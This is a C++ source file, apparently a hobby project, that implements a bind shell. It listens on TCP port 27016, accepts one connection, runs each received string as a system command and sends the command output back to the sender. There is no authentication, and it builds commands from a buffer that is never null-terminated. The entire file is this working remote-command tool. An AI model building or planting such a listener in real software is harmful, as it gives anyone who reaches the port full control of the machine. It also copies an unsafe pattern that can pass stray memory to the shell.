#include <iostream>
#include <fstream>
#include <cstdlib>
#include <string>
#include "socks.hpp"

#define DEFAULT_PORT "27016"
#define BUFFER_SIZE 512
//#define DEBUG

using std::cin, std::cout, std::cerr, std::endl;

int main() {
    int result;

    socks::SocksData data;
    result = socks::init(socks::version, &data);
    if (result == socks::error) {
        cerr << "socks::init failed with error " << socks::lastError() << endl;
        return 1;
    }

    #ifdef DEBUG
    cout << "init success..." << endl;
    #endif

    socks::AddressInfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = static_cast<int>(socks::AddressFamily::unspec);
    hints.ai_socktype = static_cast<int>(socks::SockType::stream);
    hints.ai_protocol = static_cast<int>(socks::Protocol::tcp);

    #ifdef DEBUG
    cout << "hints success..." << endl;
    #endif

    socks::AddressInfo* info;
    // Resolve the server address and port
    result = socks::getAddressInfo(nullptr, DEFAULT_PORT, &hints, &info);
    if (result == socks::error) {
        cerr << "getAddressInfo failed with error #" << socks::lastError() << endl;
        socks::drop();
        return 1;
    }

    #ifdef DEBUG
    cout << "info success..." << endl;
    #endif

    uint64_t socket = socks::get(info->ai_family, info->ai_socktype, info->ai_protocol);
    if (socket == socks::invalid_sock) {
        cerr << "socks::get failed with error " << socks::lastError() << endl;
        socks::freeAddressInfo(info);
        socks::drop();
        return 1;
    }

    #ifdef DEBUG
    cout << "get success..." << endl;
    #endif

    result = socks::bint(socket, info->ai_addr, (int)info->ai_addrlen);
    if (result == socks::error) {
        cerr << "socks::bint failed with error " << socks::lastError() << endl;
        socks::freeAddressInfo(info);
        socks::close(socket);
        socks::drop();
        return 1;
    }

    #ifdef DEBUG
    cout << "bint success..." << endl;
    #endif

    socks::freeAddressInfo(info);

    result = socks::lizten(socket, 1);
    if (result == socks::error) {
        cerr << "socks::lizten failed with error " << socks::lastError() << endl;
        socks::close(socket);
        socks::drop();
        return 1;
    }

    #ifdef DEBUG
    cout << "lizten success..." << endl;
    #endif

    uint64_t shoeket = socks::axcept(socket);
    if (shoeket == socks::invalid_sock) {
        cerr << "socks::axcept failed with error " << socks::lastError() << endl;
        socks::close(socket);
        socks::drop();
        return 1;
    }

    #ifdef DEBUG
    cout << "axcept success..." << endl;
    #endif

    socks::close(socket);

    char buffer[BUFFER_SIZE];
    while (1) {
        result = socks::receive(shoeket, buffer, BUFFER_SIZE);
        if (result == socks::error) {
            cerr << "socks::cend failed with error " << socks::lastError() << endl;
            socks::close(shoeket);
            socks::drop();
            return 1;
        }
        if (result == 0) {
            cout << "connection was closed" << endl;
            break;
        }

        #ifdef DEBUG
        cout << "received " << result << " bytes" << endl;
        #endif

        std::string command(buffer);
        cout << command << endl;
        command = "(" + command + ") > .temp 2>&1";
        std::system(command.c_str());

        std::ifstream file;
        file.open(".temp");

        std::string content;
        content.assign((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()));

        file.close();

        result = socks::cend(shoeket, content.c_str(), content.size() + 1);
        if (result == socks::error) {
            cerr << "socks::cend failed with error " << socks::lastError() << endl;
            socks::close(shoeket);
            socks::drop();
            return 1;
        }
        if (result == 0) {
            cout << "connection was closed" << endl;
            break;
        }

        #ifdef DEBUG
        cout << "sent " << result << " bytes out of " << content.size() + 1 << endl;
        #endif
    }

    std::remove(".temp");

    socks::close(shoeket);
    socks::drop();

    return 0;
}

void thingy() {
}